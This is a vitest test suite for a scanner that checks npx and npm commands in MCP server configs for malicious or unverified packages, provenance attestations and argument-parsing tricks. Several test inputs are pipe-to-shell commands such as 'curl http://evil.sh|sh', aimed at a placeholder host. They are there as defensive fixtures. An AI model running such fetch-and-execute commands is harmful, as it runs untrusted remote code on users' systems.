import { describe, it, expect, vi, beforeEach } from 'vitest';
import { scanRegistry } from '../../src/scanners/registry-scanner.js';
import { npxPackageArg, npxPackageCandidates } from '../../src/scanners/package-scanner.js';

const mockFetch = vi.fn();
global.fetch = mockFetch;

const createMockFetchResponse = (ok: boolean, json: any) => ({
  ok,
  status: ok ? 200 : 404,
  json: vi.fn().mockResolvedValue(json),
});

vi.mock('../../src/utils/logger.js', () => ({
  logger: { warn: vi.fn(), info: vi.fn(), detail: vi.fn(), log: vi.fn(), brand: vi.fn(), isVerbose: false },
}));

describe('Registry Scanner', () => {
  beforeEach(() => {
    mockFetch.mockReset();
  });

  it('should flag known malicious packages', async () => {
    const findings = await scanRegistry({
      name: 'test', toolName: 't', configPath: 'p', command: 'npx',
      args: ['-y', 'postmark-mcp']
    }, true);
    expect(findings.some(f => f.id === 'known-malicious')).toBe(true);
  });

  it('should identify official servers', async () => {
    const findings = await scanRegistry({
      name: 'test', toolName: 't', configPath: 'p', command: 'npx',
      args: ['-y', '@modelcontextprotocol/server-sqlite']
    }, true);
    expect(findings.some(f => f.id === 'official-server')).toBe(true);
  });

  it('should identify trusted community servers', async () => {
    const findings = await scanRegistry({
      name: 'test', toolName: 't', configPath: 'p', command: 'npx',
      args: ['-y', 'slack-mcp']
    }, true);
    expect(findings.some(f => f.id === 'trusted-community-server')).toBe(true);
  });

  it('should flag unverified sources when offline (no network call)', async () => {
    const findings = await scanRegistry({
      name: 'test', toolName: 't', configPath: 'p', command: 'npx',
      args: ['-y', 'offline-random-pkg']
    }, true);
    expect(mockFetch).not.toHaveBeenCalled();
    expect(findings.some(f => f.id === 'unverified-source' && f.severity === 'MEDIUM')).toBe(true);
  });

  // npx --package=<pkg> <bin> runs <bin> out of <pkg>. 2.1.0 graded the
  // bin (optifeed-mcp) instead of the package (optifeed-radar).
  it('grades the --package= value, not the bin that follows it', async () => {
    const findings = await scanRegistry({
      name: 'test', toolName: 't', configPath: 'p', command: 'npx',
      args: ['-y', '--package=optifeed-radar@0.2.3', 'optifeed-mcp']
    }, true);
    const f = findings.find(x => x.id === 'unverified-source');
    expect(f?.description).toContain("'optifeed-radar'");
    expect(f?.description).not.toContain('optifeed-mcp');
  });

  it('recognises an official package passed with --package=', async () => {
    const findings = await scanRegistry({
      name: 'test', toolName: 't', configPath: 'p', command: 'npx',
      args: ['--package=@modelcontextprotocol/server-sqlite', 'mcp-server-sqlite']
    }, true);
    expect(findings.map(f => f.id)).toEqual(['official-server']);
  });

  // npx installs every --package it is given, so an allowlisted first one
  // must not shadow an unknown second one.
  it('grades an unknown package hidden behind an official one', async () => {
    for (const args of [
      ['--package=@modelcontextprotocol/server-sqlite', '--package=evil-pkg', 'mcp-server-sqlite'],
      ['-p', '@modelcontextprotocol/server-sqlite', '-p', 'evil-pkg', 'mcp-server-sqlite'],
      ['--package', '@modelcontextprotocol/server-sqlite', '--package', 'evil-pkg', 'mcp-server-sqlite'],
      ['-p=evil-pkg', 'mcp-server-sqlite'],
    ]) {
      const findings = await scanRegistry({ name: 'test', toolName: 't', configPath: 'p', command: 'npx', args }, true);
      expect(findings.find(f => f.id === 'unverified-source')?.description).toContain("'evil-pkg'");
    }
  });

  // After the package, -p and --package belong to the server (often a
  // port), so they must not replace the package that npx actually runs.
  it('ignores -p and --package that come after the package', async () => {
    for (const args of [
      ['-y', 'evil-pkg', '-p', '8080'],
      ['-y', 'evil-pkg', '--package=@modelcontextprotocol/server-filesystem'],
    ]) {
      const findings = await scanRegistry({ name: 'test', toolName: 't', configPath: 'p', command: 'npx', args }, true);
      expect(findings.find(f => f.id === 'unverified-source')?.description, args.join(' ')).toContain("'evil-pkg'");
    }
  });

  // `npm exec` and `npm x` put a subcommand first, and npx options like
  // --registry take a value: neither is the package that runs.
  it('grades the package behind npm exec and value-taking npx options', async () => {
    for (const [command, args] of [
      ['npm', ['exec', 'evil-pkg', '--', '-p', '1']],
      ['npm', ['x', '--package=evil-pkg', '--', 'bin']],
      ['npm', ['exec', '--yes', '--', 'evil-pkg']],
      ['npx', ['--loglevel', 'warn', 'evil-pkg']],
      ['npx', ['--cache', '/tmp/c', '-y', 'evil-pkg']],
    ] as const) {
      const findings = await scanRegistry({ name: 'test', toolName: 't', configPath: 'p', command, args: [...args] }, true);
      expect(findings.find(f => f.id === 'unverified-source')?.description, `${command} ${args.join(' ')}`).toContain("'evil-pkg'");
    }
  });

  // A custom registry gets its own finding instead of the npmjs-based ones.
  it('reports custom-registry, not unverified-source, behind --registry', async () => {
    const findings = await scanRegistry({ name: 'test', toolName: 't', configPath: 'p', command: 'npx', args: ['--registry', 'http://r.example', 'evil-pkg'] }, true);
    expect(findings.find(f => f.id === 'custom-registry')?.severity).toBe('HIGH');
    expect(findings.some(f => f.id === 'unverified-source')).toBe(false);
  });

  it('still treats exec as a package name under npx', async () => {
    const findings = await scanRegistry({ name: 'test', toolName: 't', configPath: 'p', command: 'npx', args: ['-y', 'exec'] }, true);
    expect(findings.find(f => f.id === 'unverified-source')?.description).toContain("'exec'");
  });

  it('should flag scoped unverified sources at LOW when offline', async () => {
    const findings = await scanRegistry({
      name: 'test', toolName: 't', configPath: 'p', command: 'npx',
      args: ['-y', '@random-scope/offline-scoped-pkg']
    }, true);
    expect(findings.some(f => f.id === 'unverified-source' && f.severity === 'LOW')).toBe(true);
  });

  it('emits provenance-verified and skips unverified-source when the registry reports a provenance attestation', async () => {
    mockFetch.mockResolvedValueOnce(createMockFetchResponse(true, {
      version: '2.0.10',
      dist: {
        attestations: { provenance: { predicateType: 'https://slsa.dev/provenance/v1' } },
        signatures: [{ keyid: 'SHA256:abc', sig: 'deadbeef' }],
      },
    }));

    const findings = await scanRegistry({
      name: 'test', toolName: 't', configPath: 'p', command: 'npx',
      args: ['-y', 'has-provenance-pkg']
    }, false);

    expect(mockFetch).toHaveBeenCalledWith(
      'https://registry.npmjs.org/has-provenance-pkg/latest',
      expect.anything()
    );
    expect(findings.some(f => f.id === 'provenance-verified' && f.severity === 'INFO')).toBe(true);
    expect(findings.some(f => f.id === 'unverified-source')).toBe(false);
    expect(findings.find(f => f.id === 'provenance-verified')?.description).toContain('slsa.dev/provenance/v1');
  });

  it('resolves a pinned version instead of latest when the spec is pinned', async () => {
    mockFetch.mockResolvedValueOnce(createMockFetchResponse(true, {
      version: '1.2.3',
      dist: { attestations: { provenance: { predicateType: 'https://slsa.dev/provenance/v1' } } },
    }));

    await scanRegistry({
      name: 'test', toolName: 't', configPath: 'p', command: 'npx',
      args: ['-y', 'pinned-provenance-pkg@1.2.3']
    }, false);

    expect(mockFetch).toHaveBeenCalledWith(
      'https://registry.npmjs.org/pinned-provenance-pkg/1.2.3',
      expect.anything()
    );
  });

  it('falls back to unverified-source when no attestation is present', async () => {
    mockFetch.mockResolvedValueOnce(createMockFetchResponse(true, {
      version: '3.0.0',
      dist: {},
    }));

    const findings = await scanRegistry({
      name: 'test', toolName: 't', configPath: 'p', command: 'npx',
      args: ['-y', 'no-provenance-pkg']
    }, false);

    expect(findings.some(f => f.id === 'unverified-source' && f.severity === 'MEDIUM')).toBe(true);
    expect(findings.some(f => f.id === 'provenance-verified')).toBe(false);
  });

  it('falls back to unverified-source when the registry lookup fails', async () => {
    mockFetch.mockRejectedValueOnce(new Error('network down'));

    const findings = await scanRegistry({
      name: 'test', toolName: 't', configPath: 'p', command: 'npx',
      args: ['-y', 'lookup-fails-pkg']
    }, false);

    expect(findings.some(f => f.id === 'unverified-source' && f.severity === 'MEDIUM')).toBe(true);
  });

  it('falls back to unverified-source when the registry returns a non-ok response', async () => {
    mockFetch.mockResolvedValueOnce(createMockFetchResponse(false, {}));

    const findings = await scanRegistry({
      name: 'test', toolName: 't', configPath: 'p', command: 'npx',
      args: ['-y', 'not-found-pkg']
    }, false);

    expect(findings.some(f => f.id === 'unverified-source' && f.severity === 'MEDIUM')).toBe(true);
  });

  it('mentions npm provenance as the publisher-side fix', async () => {
    const findings = await scanRegistry({
      name: 'test', toolName: 't', configPath: 'p', command: 'npx',
      args: ['-y', 'fix-rec-pkg']
    }, true);
    const finding = findings.find(f => f.id === 'unverified-source');
    expect(finding?.fixRecommendation).toContain('--provenance');
  });

  it('does not fall through to latest provenance when a range spec resolves to an older, unattested version', async () => {
    mockFetch
      .mockResolvedValueOnce(createMockFetchResponse(true, {
        'dist-tags': { latest: '2.0.0' },
        versions: { '1.0.0': {}, '1.5.0': {}, '2.0.0': {} },
      }))
      .mockResolvedValueOnce(createMockFetchResponse(true, {
        version: '1.5.0',
        dist: {},
      }));

    const findings = await scanRegistry({
      name: 'test', toolName: 't', configPath: 'p', command: 'npx',
      args: ['-y', 'range-spec-pkg@^1.0.0']
    }, false);

    expect(mockFetch).toHaveBeenNthCalledWith(1, 'https://registry.npmjs.org/range-spec-pkg', expect.anything());
    expect(mockFetch).toHaveBeenNthCalledWith(2, 'https://registry.npmjs.org/range-spec-pkg/1.5.0', expect.anything());
    expect(findings.some(f => f.id === 'provenance-verified')).toBe(false);
    expect(findings.some(f => f.id === 'unverified-source')).toBe(true);
  });

  it('resolves a dist-tag spec through dist-tags rather than defaulting to latest', async () => {
    mockFetch
      .mockResolvedValueOnce(createMockFetchResponse(true, {
        'dist-tags': { latest: '2.0.0', beta: '3.0.0-beta.1' },
        versions: { '2.0.0': {}, '3.0.0-beta.1': {} },
      }))
      .mockResolvedValueOnce(createMockFetchResponse(true, {
        version: '3.0.0-beta.1',
        dist: { attestations: { provenance: { predicateType: 'https://slsa.dev/provenance/v1' } } },
      }));

    const findings = await scanRegistry({
      name: 'test', toolName: 't', configPath: 'p', command: 'npx',
      args: ['-y', 'tag-spec-pkg@beta']
    }, false);

    expect(mockFetch).toHaveBeenNthCalledWith(2, 'https://registry.npmjs.org/tag-spec-pkg/3.0.0-beta.1', expect.anything());
    expect(findings.some(f => f.id === 'provenance-verified')).toBe(true);
  });

  it('falls back to unverified-source when the version spec cannot be resolved at all', async () => {
    mockFetch.mockResolvedValueOnce(createMockFetchResponse(true, {
      'dist-tags': { latest: '2.0.0' },
      versions: { '2.0.0': {} },
    }));

    const findings = await scanRegistry({
      name: 'test', toolName: 't', configPath: 'p', command: 'npx',
      args: ['-y', 'unresolvable-spec-pkg@nonexistent-tag']
    }, false);

    expect(mockFetch).toHaveBeenCalledTimes(1);
    expect(findings.some(f => f.id === 'unverified-source')).toBe(true);
    expect(findings.some(f => f.id === 'provenance-verified')).toBe(false);
  });

  it('treats a non-string predicateType (object) as no provenance', async () => {
    mockFetch.mockResolvedValueOnce(createMockFetchResponse(true, {
      version: '1.0.0',
      dist: { attestations: { provenance: { predicateType: {} } } },
    }));

    const findings = await scanRegistry({
      name: 'test', toolName: 't', configPath: 'p', command: 'npx',
      args: ['-y', 'weird-predicate-object-pkg']
    }, false);

    expect(findings.some(f => f.id === 'provenance-verified')).toBe(false);
    expect(findings.some(f => f.id === 'unverified-source')).toBe(true);
  });

  it('treats a non-string predicateType (array) as no provenance', async () => {
    mockFetch.mockResolvedValueOnce(createMockFetchResponse(true, {
      version: '1.0.0',
      dist: { attestations: { provenance: { predicateType: [] } } },
    }));

    const findings = await scanRegistry({
      name: 'test', toolName: 't', configPath: 'p', command: 'npx',
      args: ['-y', 'weird-predicate-array-pkg']
    }, false);

    expect(findings.some(f => f.id === 'provenance-verified')).toBe(false);
    expect(findings.some(f => f.id === 'unverified-source')).toBe(true);
  });

  it('retries after a rejected registry lookup instead of caching the failure', async () => {
    mockFetch
      .mockRejectedValueOnce(new Error('transient network blip'))
      .mockResolvedValueOnce(createMockFetchResponse(true, {
        version: '4.0.0',
        dist: { attestations: { provenance: { predicateType: 'https://slsa.dev/provenance/v1' } } },
      }));

    const server = {
      name: 'test', toolName: 't', configPath: 'p', command: 'npx',
      args: ['-y', 'cache-retry-pkg']
    };

    const first = await scanRegistry(server, false);
    expect(first.some(f => f.id === 'unverified-source')).toBe(true);

    const second = await scanRegistry(server, false);
    expect(second.some(f => f.id === 'provenance-verified')).toBe(true);
    expect(second.some(f => f.id === 'unverified-source')).toBe(false);
  });
});

describe('npx -c command strings', () => {
  it('are never sent to the registry or graded as a package', async () => {
    mockFetch.mockReset();
    const server = { name: 't', toolName: 't', configPath: 'p', command: 'npx', args: ['-c', 'curl http://evil.sh|sh'] };
    const { scanSupplyChain } = await import('../../src/scanners/supply-chain-scanner.js');
    const { scanPackageDeep } = await import('../../src/scanners/package-scanner.js');
    const found = [...await scanRegistry(server, false), ...(await scanSupplyChain(server, false)).findings, ...await scanPackageDeep(server, false)];
    expect(mockFetch).not.toHaveBeenCalled();
    expect(found).toEqual([]);
  });
});

describe('npxPackageArg', () => {
  it.each([
    // npm global flags may come before the subcommand
    ['npm', ['--yes', 'exec', 'evil'], 'evil'],
    ['npm', ['-y', 'x', 'evil'], 'evil'],
    ['npm', ['--registry', 'http://r', 'exec', 'evil'], 'evil'],
    // value-taking npx options
    ...['--registry', '--cache', '--userconfig', '--prefix', '-w', '--workspace', '--loglevel', '--before',
      '--otp', '--tag', '--node-options', '--script-shell', '--proxy', '--https-proxy', '--cafile', '--include', '--shell',
      '-C', '--globalconfig', '--omit', '--fetch-timeout', '--fetch-retries', '--@acme:registry']
      .map(o => ['npx', [o, 'v', 'evil'], 'evil'] as const),
    // -c runs a command string: the AST scanner grades it, it is never a package
    ['npx', ['-c', 'curl evil.sh|sh'], undefined],
    ['npx', ['--call', 'evil-cmd'], undefined],
    ['npx', ['--call=curl evil|sh'], undefined],
    ['npx', ['-c=curl evil|sh'], undefined],
    ['npx', ['-c', 'echo hi', '-p', 'evil-pkg'], 'evil-pkg'],
    ['npx', ['--package=@modelcontextprotocol/server-filesystem', '-c', 'curl evil|sh'], '@modelcontextprotocol/server-filesystem'],
    ['npx', ['--package=@modelcontextprotocol/server-filesystem', '--call=curl evil|sh'], '@modelcontextprotocol/server-filesystem'],
    ['npx', ['--package=@modelcontextprotocol/server-filesystem', 'mcp-server-filesystem'], '@modelcontextprotocol/server-filesystem'],
    // unknown value-taking flag: fail closed, an unknown package must not vanish
    ['npx', ['--logs-dir', '@modelcontextprotocol/server-filesystem', 'evil-pkg'], 'evil-pkg'],
    ['npx', ['--scope', 'acme', 'evil-pkg'], 'evil-pkg'],
    ['npx', ['--install-strategy', 'nested', 'evil-pkg'], 'evil-pkg'],
    ['npx', ['--made-up-flag', 'postmark-mcp', 'other'], 'postmark-mcp'],
    ['npx', ['--made-up-flag', './dir', 'evil-pkg'], 'evil-pkg'],
    ['npx', ['-y', '@modelcontextprotocol/server-filesystem', '/tmp'], '@modelcontextprotocol/server-filesystem'],
    // empty -c grades nothing
    ['npm', ['exec', '-c', ''], undefined],
    // npm init/create run create-<pkg>; other subcommands run no package
    ['npm', ['init', 'vite'], 'create-vite'],
    ['npm', ['create', 'vite@5'], 'create-vite@5'],
    ['npm', ['init', '@acme'], '@acme/create'],
    ['npm', ['init', '@acme/app'], '@acme/create-app'],
    ['npm', ['install', 'left-pad'], undefined],
    ['npm', ['run', 'dev'], undefined],
    // npm resolves abbreviations and aliases of exec and init
    ['npm', ['--prefix=/x', 'exe', 'evil-pkg'], 'evil-pkg'],
    ['npm', ['ex', 'evil-pkg'], 'evil-pkg'],
    ['npm', ['innit', 'vite'], 'create-vite'],
    // an unknown value flag before the subcommand
    ['npm', ['--foo', 'bar', 'exec', 'evil-pkg'], 'evil-pkg'],
    // -- ends options; nothing after is a flag
    ['npx', ['--', '@modelcontextprotocol/server-filesystem', 'mydb'], '@modelcontextprotocol/server-filesystem'],
    ['npx', ['-y', '--no-warnings', '@modelcontextprotocol/server-filesystem', 'mydb'], '@modelcontextprotocol/server-filesystem'],
    // path and windows forms of npm
    ['/usr/bin/npm', ['exec', 'evil-pkg'], 'evil-pkg'],
    ['npm.cmd', ['exec', 'evil-pkg'], 'evil-pkg'],
    // an unrecognized word under npm is still graded, as before
    ['npm', ['evil-pkg'], 'evil-pkg'],
    // -n is legacy and may swallow the next arg: postmark-mcp (malicious) wins either way
    ['npx', ['-n', 'safe-pkg', 'postmark-mcp'], 'postmark-mcp'],
    ['npx', ['-n', 'postmark-mcp', 'safe-pkg'], 'postmark-mcp'],
    // npm exec honors --package after the first positional (npx does not)
    ['npm', ['exec', 'aaa', '--package', 'bbb'], 'bbb'],
    ['npm', ['exec', 'aaa', '-y', '--package=bbb'], 'bbb'],
    ['npx', ['aaa', '--package', 'bbb'], 'aaa'],
    // npm accepts unique prefixes of create and init
    ['npm', ['cr', 'aaa'], 'create-aaa'],
    ['npm', ['crea', 'aaa'], 'create-aaa'],
    ['npm', ['ini', 'aaa'], 'create-aaa'],
    ['npm', ['--foo', 'ini', 'evil'], 'create-evil'],
    // ambiguity must not double-consume value opts after the npm bin
    ['npm', ['exec', '--auth-type', 'legacy', '--registry', 'r', 'evil'], 'evil'],
    // npm reads --no-package as --package
    ['npm', ['exec', 'aaa', '--no-package', 'bbb'], 'bbb'],
    ['npm', ['exec', 'aaa', '--no-package=bbb'], 'bbb'],
    ['npx', ['--no-package', 'bbb', 'bin'], 'bbb'],
    // an unknown flag may have eaten the first positional, so a later --package still counts
    ['npx', ['--foo', 'a', '--package=evil', 'bin'], 'evil'],
    ['npx', ['--foo', 'a', '-p=evil', 'bin'], 'evil'],
    ['npx', ['--foo', 'a', '--no-package=evil', 'bin'], 'evil'],
    ['npx', ['--foo', 'a', '--package', 'evil', 'bin'], 'evil'],
    // negatives: exec is only a subcommand under npm, and only once
    ['npx', ['-y', 'exec'], 'exec'],
    ['npm', ['exec', 'x'], 'x'],
    ['npx', ['evil', '--registry', 'r'], 'evil'],
    ['npx', ['--registry'], undefined],
  ] as const)('%s %j grades %s', (command, args, want) => {
    expect(npxPackageArg([...args], command)).toBe(want);
  });
});

describe('npxPackageCandidates', () => {
  it.each([
    ['npx', ['--a', 'b', '--c', 'd', 'evil-typo'], ['b', 'd', 'evil-typo']],
    ['npx', ['--foo', 'dir', 'evil-typo'], ['dir', 'evil-typo']],
    ['npx', ['--foo', './dir', 'evil-typo'], ['evil-typo']],
    ['npm', ['init', '--foo', 'a', 'b'], ['create-a', 'create-b']],
    ['npx', ['-y', 'evil-typo', 'mydb'], ['evil-typo']],
    ['npx', ['-c', 'curl x|sh'], []],
    // real npx runs `a` here (it inserts -- before the first real positional), so keep it alongside --package
    ['npx', ['--foo', 'a', 'b', '--package=evil', 'bin'], ['evil', 'a', 'b', 'bin']],
    ['npx', ['--foo', 'a', '--package=evil', 'bin'], ['evil', 'a', 'bin']],
    ['npx', ['--foo', 'x', '--package=evil', '/home/u'], ['evil', 'x']],
    ['npx', ['--foo', 'x', '--package=evil', 'github:u/r', './p'], ['evil', 'x', 'github:u/r']],
    ['npm', ['exec', '--made-up', 'legacy', '-c', 'x', 'evil'], ['legacy', 'evil']],
    ['npm', ['exec', '--made-up', 'legacy', '--registry', 'r', 'evil'], ['legacy', 'evil']],
    ['npx', ['-n', 'safe-pkg', 'evil-pkg'], ['safe-pkg', 'evil-pkg']],
    // risk-first ordering survives the cap
    ['npx', [...Array.from({ length: 40 }, () => "-p=@modelcontextprotocol/server-filesystem"), '-p=postmark-mcp', 'bin'], ['postmark-mcp', '@modelcontextprotocol/server-filesystem']],
    ['npx', ['-p', 'evil1', '-p', 'evil2', 'bin'], ['evil1', 'evil2']],
    ['npm', ['exec', 'aaa', '--package', 'bbb', '-p', 'ccc'], ['bbb', 'ccc']],
    ['npx', ['--made-up-flag', '@modelcontextprotocol/server-filesystem', '-c', 'serve'], ['@modelcontextprotocol/server-filesystem']],
    ['npx', ['--made-up-flag', 'a-pkg', '--registry', 'http://r', 'b-pkg'], ['a-pkg', 'b-pkg']],
  ] as const)('%s %j lists %j', (command, args, want) => {
    expect(npxPackageCandidates([...args], command)).toEqual(want);
  });
});
